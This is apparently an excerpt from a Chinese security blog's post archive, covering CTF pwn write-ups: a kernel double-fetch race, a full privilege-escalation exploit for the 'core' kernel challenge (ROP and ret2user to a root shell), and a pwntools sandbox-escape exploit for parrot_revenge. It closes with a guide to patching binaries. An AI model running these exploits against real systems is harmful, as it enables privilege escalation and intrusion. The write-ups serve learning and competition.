&lt;stdio.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;struct _input &#123; char *flag; size_t len;&#125;;int main(int argc,char *argv[])&#123; int i , fd; char *buf; struct _input input ; if (argc!=2)&#123; printf("argc error"); return -1; &#125; printf("&lt;= DBG =&gt; input : %s len: %d \n",argv[1],strlen(argv[1])); mmap(0,0x1000,PROT_NONE,MAP_SHARED|MAP_ANONYMOUS,0,0); buf = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,0,0); mmap(0,0x1000,PROT_NONE,MAP_SHARED|MAP_ANONYMOUS,0,0); if(buf&gt;0) printf("&lt;= DBG =&gt; get a memeroy: %p\n",buf); for(i=0 ; i&lt;strlen(argv[1]);i++)&#123; buf[0x1000 - strlen(argv[1]) + i] = argv[1][i]; printf("&lt;= DBG =&gt; addr: %p content: %c \n", &amp;buf[0x1000 - strlen(argv[1]) + i], argv[1][i] ); &#125; fd = open("/dev/baby",O_RDWR); if(fd&lt;0)&#123; printf("cannot open /dev/baby\n"); return -1; &#125; printf("&lt;= DBG =&gt; fd of /dev/baby: %d\n",fd); ((struct _input * )buf)-&gt;len = 33; ((struct _input * )buf)-&gt;flag = (buf+0x1000-strlen(argv[1])); printf("&lt;= DBG =&gt; input: %p\n",input.flag); ioctl(fd,0x1337,buf); close(fd);&#125; 预期解预期解的漏洞叫做double fetch漏洞，应该算是一种竞争条件漏洞 Serna[ Serna, F. J. MS08-61:thecaseofthekernelmodedoublefetch,2008.https://blogs.technet.microsoft.com/srd/2008/10/14/ms08-061-the-case-of-the-kernel-mode-double-fetch/.] 用户通常会通过调用内核函数完成特定功能，当内核函数两次从同一用户内存地址读取同一数据时，通常第一次读取用来验证数据或建立联系，第二次则用来使用该数据。与此同时，用户空间并发运行的恶意线程可以在两次内核读取操作之间，利用竞争条件对该数据进行篡改，从而造成内核使用数据的不一致。Double fetch漏洞可造成包括缓冲区溢出、信息泄露、空指针引用等后果，最终造成内核崩溃或者恶意提权。 也就是说，参数是从用户态传进来的，当用户态对传入的结构体改变时，内核读到的数据也会被改变。 因此，在用户态新建一个线程不断的修改传入的结构体中flag指针为内核flag的值。当驱动运行时，恰好通过地址验证后，在数据判断之前内核数据flag地址被改掉的话，则可以做到通过内容验证，从而打印出flag内容。 printk输出的内容可以用dmesg来查看。 此处有个坑点，是QEMU默认启动时会使用当个core、单个thread，这样内核相当于是单进程的。 而单进程的内核很难触发这个漏洞，因此需要在QEMU启动时设置好内核和进程数如： 1-m 256M -smp 2,cores=2,threads=1 \ 这个问题坑了我好久，此处非常感谢Veritas501师傅。 具体EXP，Veritas501师傅的文章写的很好了，我没有什么创新点就不写了。 referencehttps://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/ https://www.secspace.com/view-ff3bbe863b544a929f96110e7b8992c8-e5cf621eacdb49b3b35b71a20e0ce9be.html]]></content>
      <tags>
        <tag>KERNEL</tag>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【KERNEL PWN】强网杯CTF2018 core题解]]></title>
    <url>%2F2018%2F07%2F13%2Fciscn2018-core%2F</url>
    <content type="text"><![CDATA[题目及相关文件下载，密码：914k 这是一道接近于libc的overflowme的题目了，调试还是比较麻烦，如果大佬们有好用的kernel用gdb插件麻烦告知我一下，环境好容易崩溃啊… core题目&amp;漏洞分析题目中注册了core_write、core_ioctl，而在core_ioctl中会根据参数去调用core_read、core_copy_func函数。 core_write: 用户可以向全局变量中写入一个不大于0x800的字符串内容 core_ioctl：分为3个case，维护了一个全局变量，当参数为0x6677889c的时候，可以设置这个变量，其余情况会分别调用core_read、core_copy_func函数 core_read：会根据core_ioctl维护的全局变量，从栈上读出长度为0x40的数据，这里很显然可以越界读数据，栈上的返回地址、canary之类的都可以读到 core_copy_func：会根据用户的输入长度，从name这个全局变量中向栈上读出数据。在判断时这个变量的类型是signed long long，而读出的时候变成了signed short，显然存在一个截断，当使用如0xf000000000000300这样的数据就可以绕过限制，造成内核的栈溢出。可以说是为了出题而出题了… 漏洞利用首先检查一下内核的安全保护机制，通过查看start.sh发现没有开启smep，开启了kalsr和canary的。所谓smep是内核为了避免ret2user的利用方法增加的一种保护方法，即内核代码不能跳转到用户空间去执行代码，绕过方法也很简单，使用内核的ROP就可以了，但此题由于没有这个保护，可以直接使用ret2user的攻击方法。 题目给出的目录结构是这样的： core.cpio：这是一个打包的文件，解包以后发现里面有文件系统，其中以vmlinux命名的是内核的二进制文件，core.ko是存在漏洞的驱动，也就是题目分析中分析的二进制文件。 start.sh： 启动脚本，标明启动的方法、保护措施等 bzImage：镜像文件 这里类比于libc中的pwn，感觉*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的。 内存地址泄露这个漏洞在分析中已经说过了，在ioctl中设置全局变量的值，然后利用core_read函数可以泄露栈上的数据： 首先先对core驱动下断点，断点的下法是，首先在qemu中查看/sys/module/core/sections/.text文件，找到镜像加载的基地址： 然后在gdb端，执行add-symbol-file ./core/core.ko 0xffffffffc03a0000 ，为驱动增加符号表 这样就可以下断点了，首先看一下再core_read的栈内容。 由于kernel pwn 的最终目的是提权到root，一种简单的方法是执行 1commit_creds(prepare_kernel_cred(0)); 而commit_creds、prapare_kernel_cred都是内核函数，在vmlinux中，因此还需要泄露vmlinux的基地址。 而在栈地址中并不能看出来哪个地址属于vmlinux，这里用一个应该算是复杂的方法吧。 首先找到这两个函数在vmlinux的偏移： 1234from pwn import *elf = ELF('./core/vmlinux')print "commit_creds",hex(elf.symbols['commit_creds']-0xffffffff81000000)print "prepare_kernel_cred",hex(elf.symbols['prepare_kernel_cred']-0xffffffff81000000) 在qemu里查看/proc/kallsyms中的 commit_creds 函数地址 而计算之后，找到vmlinux的基址： 12345Python 2.7.12 (default, Nov 20 2017, 18:23:56) [GCC 5.4.0 20160609] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; hex(0xffffffffba89c8e0-0x9c8e0)'0xffffffffba800000L' 可以发现在栈上有一条数据在vmlinux不远处，距离为0x9dd6d1 控制RIP能够泄露vmlinux、驱动和canary了以后，就变得比较容易了。 首先预先构造好ROP，使用core_write写入到全局变量name中备用。 执行ROPgadget –binary vmlinux &gt; 1.txt保存gadget备用，这个过程慢到令人发指… 而在core_copy_func中，构造长度为0xf000000000000300，即可成功覆盖RIP ROP构造其实，提取过程很容易，流程是： 1 执行 commit_creds(prepare_kernel_cred(0))，此时该进程已经是id为0的root进程了，但是仍在内核态中。而这条语句的执行可以用ROP来做，由于SMEP没开，ret2user也可以，ret2user就是在编写的程序中写入一个函数调用该函数，将ROP的该部分直接写成用户态函数的地址； 2 执行swapgs，准备回到用户态 3 iretq回到用户态，在rsp指向的位置布置好相关寄存器的值，特别的将rip寄存器的值保存为执行system(“/bin/sh”)，再返回用户态后就可以拿到一个root权限的shell了。 EXProp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;pthread.h&gt;void setoff(int fd,long long size)&#123; ioctl(fd,0x6677889C,size);&#125;void core_read(int fd,char *buf)&#123; ioctl(fd,0x6677889b,buf);&#125;void core_copy_func(int fd,long long size)&#123; ioctl(fd,0x6677889a,size);&#125;unsigned long user_cs, user_ss, user_eflags,user_sp ;void save_stats() &#123; asm( "movq %%cs, %0\n" "movq %%ss, %1\n" "movq %%rsp, %3\n" "pushfq\n" "popq %2\n" :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp) : : "memory" );&#125;void get_shell()&#123; system("/bin/sh");&#125;int main()&#123; int fd ; size_t tmp ; char buf[0x50]; size_t shellcode[0x100]; size_t vmlinux_base,canary,module_core_base; size_t commit_creds = 0x9c8e0; size_t prepare_kernel_cred = 0x9cce0; save_stats(); fd = open("/proc/core",O_RDWR); if(fd &lt; 0 )&#123; printf("Open /proc/core error!\n"); exit(0); &#125; setoff(fd,0x40); core_read(fd,buf); /* for test for(int i = 0;i&lt;8;i++)&#123; tmp = *(size_t *)(&amp;buf[i*8]); printf("[%d] %p\n",i,tmp); &#125; */ size_t pop_rdi = 0x000b2f; size_t push_rax = 0x02d112; size_t swapgs = 0x0d6; size_t iret ; size_t xchg = 0x16684f0; size_t call_rax=0x40398; size_t pop_rcx = 0x21e53; size_t pop_rbp = 0x3c4; //: pop rbp ; ret size_t pop_rdx = 0xa0f49 ;//: pop rdx ; ret size_t mov_rdi_rax_call_rdx = 0x01aa6a; vmlinux_base = (*(size_t *)(&amp;buf[4*8])-0x1dd6d1 ); printf("[+] vmlinux_base:%p\n",vmlinux_base); canary = (*(size_t *)(&amp;buf[0])); printf("[+] canary:%p\n",canary); module_core_base = (*(size_t *)(&amp;buf[2*8])-0x19b ); printf("[+] module_core_base:%p\n",module_core_base); commit_creds+=vmlinux_base; prepare_kernel_cred += vmlinux_base; pop_rdi += vmlinux_base; push_rax += vmlinux_base; swapgs += module_core_base ; iret = 0x50ac2+vmlinux_base; xchg += vmlinux_base; call_rax += vmlinux_base; pop_rcx += vmlinux_base; mov_rdi_rax_call_rdx +=vmlinux_base; pop_rdx += vmlinux_base; printf("[+] commit_creds:%p\n",commit_creds); printf("[+] prepare_kernel_cred:%p\n",prepare_kernel_cred); //shellcode[0]=shellcode[0] //shellcode[] = for(int i=0;i&lt;9;i++)&#123; shellcode[i]=canary; &#125; shellcode[9] = (*(size_t *)(&amp;buf[1]) ); shellcode[10] = pop_rdi; //0xdeadbeefdeadbeef; shellcode[11] = 0; shellcode[12] = prepare_kernel_cred; shellcode[13] = pop_rdx; shellcode[14] = pop_rcx; shellcode[15] = mov_rdi_rax_call_rdx; shellcode[16] = commit_creds; shellcode[17] = swapgs; shellcode[18] = shellcode; shellcode[19] = iret; shellcode[20] = (size_t)get_shell; shellcode[21] = user_cs; shellcode[22] = user_eflags; shellcode[23] = user_sp; shellcode[24] = user_ss; write(fd,shellcode,25*8); core_copy_func(fd,0xf000000000000000+25*8);&#125; ret2user1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;unsigned long user_cs, user_ss, user_eflags,user_sp ;void save_stats() &#123; asm( "movq %%cs, %0\n" "movq %%ss, %1\n" "movq %%rsp, %3\n" "pushfq\n" "popq %2\n" :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp) : : "memory" );&#125;void get_shell(void)&#123; system("/bin/sh");&#125;//eip =(unsigned long long) get_shell;#define KERNCALL __attribute__((regparm(3)))void* (*prepare_kernel_cred)(void*) KERNCALL ;void (*commit_creds)(void*) KERNCALL ;void payload()&#123; commit_creds(prepare_kernel_cred(0));&#125;void setoff(int fd,int off)&#123; ioctl(fd,0x6677889C,off);&#125;void core_read(int fd,char *buf)&#123; ioctl(fd,0x6677889B,buf);&#125;void core_copy(int fd , unsigned long long len)&#123; ioctl(fd, 0x6677889A,len);&#125;int main(void)&#123; save_stats() ; unsigned long long buf[0x40/8]; memset(buf,0,0x40); unsigned long long canary ; unsigned long long module_base ; unsigned long long vmlinux_base ; unsigned long long iretq ; unsigned long long swapgs ; unsigned long long rop[0x30]; memset(buf,0,0x30*8); int fd = open("/proc/core",O_RDWR); if(fd == -1)&#123; printf("open file error\n"); exit(0); &#125; else&#123; printf("open file success\n"); &#125; printf("[*] buf: 0x%p",buf); setoff(fd,0x40); core_read(fd,buf); canary = buf[0]; module_base = buf[2] - 0x19b; vmlinux_base = buf[4] - 0x16684f0; printf("[*] canary: 0x%p",canary); printf("[*] module_base: 0x%p",module_base); printf("[*] vmlinux_base: 0x%p",vmlinux_base); commit_creds = vmlinux_base + 0x9c8e0; prepare_kernel_cred = vmlinux_base + 0x9cce0; iretq = vmlinux_base + 0x50ac2; swapgs = module_base + 0x0d6; rop[8] = canary ; rop[10] = payload; rop[11] = swapgs; rop[12] = 0; rop[13] = iretq ; rop[14] = get_shell ; rop[15] = user_cs; rop[16] = user_eflags; rop[17] = user_sp; rop[18] = user_ss; rop[19] = 0; write(fd,rop,0x30*8); core_copy(fd,0xf000000000000000+0x30*8);&#125; referencehttps://www.anquanke.com/post/id/86490 http://bobao.360.cn/learning/detail/3702.html]]></content>
      <tags>
        <tag>KERNEL</tag>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【WCTF 2018】parrot_revenge 题解]]></title>
    <url>%2F2018%2F07%2F11%2FWCTF-2018%2F</url>
    <content type="text"><![CDATA[parrot_revenge题目解析题目给出了两个binary文件，分别是parent和parrot_revenge。 parent这是个沙箱程序，使用fork开辟了一个子进程，并用execve将parrot_revenge的子进程加载到当前的代码段，并用ptrace实现了对子进程的监控。 再看父进程，实现了一个对子进程的沙箱逻辑。具体实现在0x400a33这个函数中： 首先进行了沙箱的初始化，对于子进程将call malloc处的第一个字节由0xe8改为0xcc，并将原来的值存储起来，这样在子进程执行到call malloc处的时候就会产生一个中断，可以被父进程监听到。 当执行完成后，父进程会在一个死循环里监听子进程的系统调用，系统调用分为两种，第一种是父进程在初始化时对call malloc的0xcc中断，另外一种是程序正常调用的syscall中断。 对这两种中断分别的处理方法如下： 首先检查rip，即程序执行的地址是否为call malloc，进而检查是否执行的代码是0xcc，再检查程序rdi寄存器，也就是函数第一个参数是否在0x6f到0x1000范围内，如果是则rip-1，并恢复call malloc代码，再使用单步执行（singlestep）方法执行一条指令，再次保存call malloc地址指令，并重置为0xcc。 如不是，则检查系统调用号，当系统调用号不为0、1、9、12，则将子进程杀死。 parrot_revenge子进程的逻辑很简单，在while循环中循环执行操作，包括malloc、read、write，当控制的局部变量为1时，退出操作。 漏洞分析程序在父进程和子进程中均存在漏洞。 parrot_revenge在子进程中malloc过后，即向得到的地址+size处写\x00操作，这个漏洞和SUCTF 2018的noend题目一样，都未检查malloc函数的返回值，当size过大时，malloc会返回0，这样size+0取决于size，造成一个内存任意写一字节0的漏洞。 parent父进程中存在一个漏洞，这个漏洞在程序执行call malloc的ptrace(PTRACE_SINGLESTEP, pid, 0LL, 0LL);执行过后，会取得该处指令去更新保存的静态变量，当单步执行改变了call malloc处指令时，程序在下一次执行时就会执行非保存的call指令(\xe8)。 漏洞利用这个程序最开始以为是只有一次执行的，因为无法预知栈地址，不能找到程序的循环次数变量来覆写，就很尴尬。一度以为没法做。 在赛场测试中无意发现，当size取0x4007ae时，会向cmp eax,1处写0，造成程序在while循环中无限循环… 但是在本地却无法更改，没有搭起本地调试环境。 环境搭建在赛后与主办方交流时候发现，其实这题在题目描述中给了hint来搭建本地环境。 在题目中提示： 1Env : Linux DESKTOP-ES068S3 4.4.0-17134-Microsoft #81-Microsoft Sun May 20 01:14:00 PST 2018 x86_64 x86_64 x86_64 GNU/Linux 这代表是Windows10操作系统的ubuntu子系统，在比赛结束后，我根据这篇博客里所述的操作搭建起了环境，注意选择应用商店中的ubuntu 16.04。在搭建好环境后，我使用gdb挂起程序，发现了linux和Windows子系统环境的不同，在Windows的子系统中被ptrace子程序的代码段是rwx的，而linux中是r-x的，这也是赛场环境中可以改代码段的原因。 Ubuntu 16.04 Window10子系统ubuntu 16.04 任意代码执行在比赛时发现了代码段可以改时，我们进行了疯狂测试，发现全部代码段都是可以改的，只要保证程序汇编指令不崩溃。 首先我们发现程序主要识别变量的方法是mov rax,[rbp+size]及mov [rbp+size],rax。而size这个变量是单字节表示的，当size=0时，即mov [rbp+0],rax。而在main函数中，rbp指向的内容是_libc_csu_init函数的地址，是在.text段上的0x4007C0位置 而这个位置位于main函数的高地址部分。 当修改下图中的ptr变量，即可在每次函数写时，向_libc_csu_init写入内容。 注意到函数的exit(0)调用使用的汇编语句是 e8 82 fd ff ff ff 这样的call指令跳转方法是用的相对偏移来定的，当我们向该位置写\x00使这条指令变成 e8 82 00 00 00时，就变成了调用当前eip（0x4007be）+0x82的位置——0x400840，而这个位置恰好在0x4007c0的高地址位置，也就是说我们可以先向这个位置写汇编指令，再退出就可以跳转拿到我们预先布置的shellcode上了。 还需要解决如何退出的问题，我们之前用cmp rax，0来保证程序循环，我们将 中红框两处代码均改为[rbp+0]，即可达到效果，上述改动需要保证一定的顺序，使得程序不崩溃。 1234567891011121314151617181920212223242526def malloc(len,content): p.recvuntil('ize:') p.sendline(str(len)) p.recvuntil('Buffer:') p.send(content)#'4196270'def malloc2(len,content): p.recvuntil('Size:') p.sendline(str(len)) p.recvuntil('Buffer:') #p.send(content)# cmp 0malloc(0x4007AE,'')# exit 0*3malloc(0x4007B9 + 5,'')malloc(0x4007B8 + 5,'')malloc(0x4007B7 + 5,'')malloc(0x4007A5,'')malloc(0x400789,'')malloc(0x400762,'')core = shellcraft.amd64.write(1, 'input:', 0x10) + shellcraft.amd64.read(0,0x400700,0x100) + "mov rax,0x400700\njmp rax\n" shellcode = asm('lab1 : ' + core +'nop\n' * (0x80 - len(asm(core,arch = 'amd64'))) + 'jmp lab1', arch = 'amd64')malloc(0x150, shellcode)p.recvuntil('Buffer:')malloc(0x400736,'')malloc(0,'') 这样可以执行我们写入的core代码。 沙箱逃逸注意到程序本身存在一个ptrace沙箱，只能执行部分系统调用，可以执行的系统调用时read、write、mmap、exit显然不能拿到flag，比赛结束前我们就卡在这里… 在比赛结束后，听了出题队伍的分享，根据里面的hint做出了沙箱逃逸的部分（PPT照片在最后） 首先，利用的漏洞就是漏洞分析中提到的，当单步执行的代码会改变该条指令时，即可在下一次执行时改变执行的语句。由于singlestep仅能执行一条指令，所以再执行该条指令时需对执行进行自修改。 第一次保存的代码是\xe8，即call指令，而call执行时会在栈上push一个返回地址，当将栈指向当前指令执行位置时，可以将该条指令改变，此次将其改变为\x00，shellcode布置如下： 12345678910110x400700 mov rdi,0x70 #绕过rdi的范围检查 mov r9,0x40073e xchg rsp,r9 nop nop ; padding0x40073D \xcc\x00\x00\x00\x00 #在实际运行时会变成call 0x0也就是push返回地址，并继续向下执行0x400742 mov r9,0x601200 xchg rsp,r9 shellcraft.amd64.write(1,&quot;step 1&quot;,0x6) shellcraft.amd64.read(0,0x400700,0x100) mov rax,0x400700 jmp rax 在这轮完成后，程序保存在0x40073d位置的指令从\xe8变成了\x00 我们的目标是执行syscall（\x0f\x05），因此需要在下一次执行时，将\x00变成\x0f 在一阶段的shellcode中已经构成了输入循环，因此可以再次布置二阶段的shellcode，如下： 12345678910110x400700 mov rdi,0x70 #绕过rdi的范围检查 mov al,0x0f mov rcx,0x40073D nop nop ; padding0x40073D \xcc\x41\x00\x90\x90 #在实际运行时会变成00 41 00 也就是 add byte ptr[rcx+0x0],al0x400742 mov r9,0x601200 xchg rsp,r9 shellcraft.amd64.write(1,&quot;step 1&quot;,0x6) shellcraft.amd64.read(0,0x400700,0x100) mov rax,0x400700 jmp rax 这时，保存的\x00变成了\x0f，下一阶段就可以在此处调用syscall了。 由于父进程对该处的rdi有检查，execve(‘/bin/sh’,0,0)和open(‘/home/chall/flag.txt’,0)就无法调用了，此处调用openat(0x70,”/home/chall/flag.txt”,0)，这个函数第一个参数是文件夹指针，而当第二个参数是绝对路径时无视该指针，与open相同，shellcode3布置为： 123456780x400700 shellcraft.amd64.openat(0x70,&quot;/home/p4nda/flag.txt&quot;,0)[:-2] nop nop ; padding0x40073D \xcc\x05\x90\x90\x90 #在实际运行时会变成00 41 00 也就是 add byte ptr[rcx+0x0],al0x400742 mov r9,0x601900 xchg rsp,r9 xchg rsp,r9 shellcraft.amd64.read(3,0x601200,0x100) shellcraft.amd64.write(1,0x601200,0x100) 即可读出flag，由于在本地测试，flag是我随手写的： EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#! /usr/bin/env python# -*- coding: utf-8 -*-from pwn import *#from pwnlib.util.iters import bruteforce# socat TCP4-LISTEN:10001,fork EXEC:"./parent.org ./parrot_revenge"import stringcontext.log_level="debug"debug = 1if debug : p = remote('10.101.168.102',10001)else: p = remote('172.16.13.222',31337)##p=process(['./parent','./parrot_revenge'] )elf = ELF('./parrot_revenge')def malloc(len,content): p.recvuntil('ize:') p.sendline(str(len)) p.recvuntil('Buffer:') p.send(content)#'4196270'def malloc2(len,content): p.recvuntil('Size:') p.sendline(str(len)) p.recvuntil('Buffer:') #p.send(content)# cmp 0malloc(0x4007AE,'')# exit 0*3malloc(0x4007B9 + 5,'')malloc(0x4007B8 + 5,'')malloc(0x4007B7 + 5,'')malloc(0x4007A5,'')malloc(0x400789,'')malloc(0x400762,'')core = shellcraft.amd64.write(1, 'input:', 0x10) + shellcraft.amd64.read(0,0x400700,0x100) + "mov rax,0x400700\njmp rax\n" #+ shellcraft.amd64.openat(-3,'/home/p4nda/flag.txt', 0)#shellcraft.amd64.openat('/home/p4nda/flag.txt', 0)shellcode = asm('lab1 : ' + core +'nop\n' * (0x80 - len(asm(core,arch = 'amd64'))) + 'jmp lab1', arch = 'amd64')print len(shellcode)malloc(0x150, shellcode)p.recvuntil('Buffer:')malloc(0x400736,'')malloc(0,'')# set save_op 0x00shellcode1 = "mov rdi,0x70\nmov r9,0x40073e\nxchg rsp,r9\n"# +shellcraft.amd64.read(0,0x400700,0x100)asm_shellcode1 = asm(shellcode1,arch='amd64')asm_shellcode1 = asm_shellcode1.ljust(0x40073D-0x400700,'\x90')asm_shellcode1 += "\xcc\x00\x00\x00\x00"shellcode1 = "mov r9,0x601200\nxchg rsp,r9\n"+ shellcraft.amd64.write(1,"step 1",0x6) + shellcraft.amd64.read(0,0x400700,0x100) +"mov rax,0x400700\njmp rax\n"asm_shellcode1 += asm(shellcode1,arch="amd64")p.recvuntil('input:')p.send(asm_shellcode1)# set save_op 0xf0shellcode2 = "mov rdi,0x70\nmov al,0x0f\nmov rcx,0x40073D\n"asm_shellcode2 = asm(shellcode2,arch='amd64')asm_shellcode2 = asm_shellcode2.ljust(0x40073D-0x400700,'\x90')asm_shellcode2 += "\xcc\x41\x00\x90\x90"shellcode2 = "mov r9,0x601200\nxchg rsp,r9\n"+ shellcraft.amd64.write(1,"step 2",0x6) + shellcraft.amd64.read(0,0x400700,0x100) +"mov rax,0x400700\njmp rax\n"asm_shellcode2 += asm(shellcode2,arch="amd64")p.recvuntil('step 1')p.send(asm_shellcode2)#openat(0x70,"flag.txt",0)shellcode3 = shellcraft.amd64.openat(0x70,"/home/p4nda/flag.txt",0)asm_shellcode3 = asm(shellcode3,arch='amd64')[:-2]asm_shellcode3 = asm_shellcode3.ljust(0x40073D-0x400700,'\x90')asm_shellcode3 += "\xcc\x05\x90\x90\x90"shellcode3 = "mov r9,0x601900\nxchg rsp,r9\n" +shellcraft.amd64.read(3,0x601200,0x100)+ shellcraft.amd64.write(1,0x601200,0x100) #+ shellcraft.amd64.write(1,0x601200,0x100)asm_shellcode3+= asm(shellcode3,arch="amd64")p.recvuntil('step 2')p.send(asm_shellcode3)p.interactive() 参考TokyoWesterns的ppt]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF线下赛中常用的PWN题patch方法]]></title>
    <url>%2F2018%2F07%2F02%2Fpatch-in-pwn%2F</url>
    <content type="text"><![CDATA[在国赛以后，突然发现对PWN题中的patch方法了解不太深入，尤其是不够优雅，经常就用IDA直接手改了，或者就是用加一个section的方法，导致patch后的文件改动很大，尤其是在国赛中，被主办方打电话过来问是不是加了通防，本文就简单介绍一下常用的patch方法。 IDAIDA Pro是一个非常强大的工具，其中包含了对汇编指令修改的功能。 以国赛华北赛区的半决赛为例，其中有一道PWN2是一个栈溢出，代码是这样的。 很显然，在read这里有一个明显的栈溢出，修复漏洞的方法也和容易，将这个值改小成0x138就好了，下面的write也一样的改法。 这里使用IDA默认的修改插件来改，在Edit-Patch Program目录下，首先切换到IDA View-A这个汇编指令界面，并选中要改的汇编指令行: 选择Assemble/Change byte/Change word都可以，以Assemble为例在Instruction窗口，将mov edx, 1cch改为mov edx, 138h。 此时，切换到类C语言窗口可以看到该行已经被修改为了read(a1, &amp;s, 0x138uLL); 但并没有完，这仅仅修改了IDA对于该文件的数据库，并没有应用到文件中去，同样在Edit-Patch Program目录下，选择Apply patches into file…，将修改写入文件，就完成了一道简单题目的patch。 这种方法完全依靠手动，而且不能修改文件结构，可以供手动修改的位置也很少，一旦出现如UAF等悬垂指针的问题基本就很难解决了，还得依靠其他更有力的方法来解决。 lieflief是一个开源的跨平台的可执行文件修改工具，链接如下： 1https://github.com/lief-project/LIEF 对外提供了Python、C++、C的接口。 对于Python库安装可以使用pip，如 1sudo pip install lief 对于lief的API和用法就不介绍了，RTFM。 1https://lief.quarkslab.com/doc/latest/api/python/index.html 以下是几种可行的patch方法 增加segment这个方法的目的是增加一个程序段，在这个程序段中加入一个修复漏洞的程序代码，一般程序会在call某个函数时触发漏洞，一般语句为call 0x8041234，可以劫持这句话的逻辑，改成call我们定义的修复函数。 首先我们的代码程序如下： 123456789#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char** argv) &#123; printf("/bin/sh%d",102); puts("let's go\n"); printf("/bin/sh%d",102); puts("let's gogo\n"); return EXIT_SUCCESS;&#125; 我们想把第一处printf修改掉，改成我们自己的逻辑，首先需要编译一个包含实现patch函数的静态库，比如： 123456789101112131415161718192021222324void myprintf(char *a,int b)&#123; asm( "mov %rdi,%rsi\n" "mov $0,%rdi\n" "mov $0x20,%rdx\n" "mov $0x1,%rax\n" "syscall\n" );&#125;void myputs(char *a)&#123; asm( "push $0x41414141\n" "push $0x42424242\n" "push %rsp\n" "pop %rsi\n" "mov $0,%rdi\n" "mov $0x20,%rdx\n" "mov $0x1,%rax\n" "syscall\n" "pop %rax\n" "pop %rax\n" );&#125;//gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook 如上，将printf改成了write(0,”/bin/sh%d”,0x20)，利用注释的gcc命令将其编译。 patch程序的流程是首先将代码段加入到binary程序中，然后修改跳转逻辑，将call printf@plt，改成call myprintf。 lief中提供了add参数可以用于为二进制文件增加段： 123binary = lief.parse(binary_name)lib = lief.parse(lib_name) segment_add = binary.add(lib.segments[0]) 在修改跳转语句部分，由程序的call执行寻址方法是相对寻址的，即call addr = EIP + addr 因此需要计算写入的新函数距离要修改指令的偏移，计算方法如下： 1call xxx =(addr of new segment + offset function ) - (addr of order + 5 /*length of call xx*/) 由于偏移地址是补码表示的，因此在用python计算时需要对结果异或0xffffffff，最终patch计算函数如下： 1234567def patch_call(file,where,end,arch = "amd64"): print hex(end) length = p32((end - (where + 5 )) &amp; 0xffffffff) order = '\xe8'+length print disasm(order,arch=arch) file.patch_address(where,[ord(i) for i in order]) 执行之后可以看到patch成功了， 但是一个重大的问题是patch前后文件大小改动很大： 1234567┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/patch] - [一 7月 02, 20:36]└─[$] &lt;&gt; python 1.py0x8022f9 0: e8 70 1d 40 00 call 0x401d75[+] ori size 8656[+] patch size 15885[+] Seccessful patched in adding segment 这样在一些线下赛中很容易由于修改过大和被判定为通防或者宕机。 增加library这是借鉴LD_preload的一种思路，当程序中加载两个库时，在调用某一函数在两个库内同名存在时，是有一定查找顺序的，也就是可以实现，在不修改程序正常代码的前提下，对全部libc函数进行hook。如下例： 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; printf("/bin/sh%d", 102LL, envp, argv); return 0;&#125; 编译一个动态链接库 12345678910111213141516171819202122//#include "/home/p4nda/linux-4.17.3/lib/syscall.c"#define _GNU_SOURCE//#include &lt;stdio.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;#include &lt;dlfcn.h&gt;// gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared patch.c -o patch -ldlint printf(char *a,int b) &#123; char str[] = "hacked by me\n "; //puts(a); if(strstr(a,"/bin/sh"))&#123; puts("find dangerous str~"); &#125; int (*old_printf)(char *,int); old_printf =(int (*)(char *,int)) dlsym(RTLD_NEXT, "printf"); old_printf(a,b); puts("\n");&#125; 编译命令在注释中，则每次printf时都会先执行上述库中的函数，达到hook的目的。 优势很明显，可以执行任意libc内函数代码，让编程更容易。 不过缺点也很明显，首先程序变得巨大，并且当不存在这个静态链接库的时候，程序跑不起来… 有些线下赛都是本地check的，比如*网杯，很容易就判断宕机了… 修改程序.eh_frame段在TSCTF 2018 Final时，我在NeSE战队的binary文件中找到了通防工具，但是程序改动并没有特别大，当时感觉很好奇，在赛后调试了一下，发现他们把通防的shellcode写在了一个叫.eh_frame的段中，这个段会加载到程序中来，并且自身带有可执行权限，在查找这个段用处时，发现该段对程序执行影响不大，故可以将patch代码写在这个段中，再用跳转的方法将程序逻辑劫持到这里来。 可以看到在patch前后，程序大小保持不变。 缺点同样明显，.eh_frame的大小是有限的… 综上，似乎没有比较简洁的通用方法，综合着来用吧….]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 wannaheap 解题思路]]></title>
    <url>%2F2018%2F06%2F28%2Fpwnable-tw-wannaheap%2F</url>
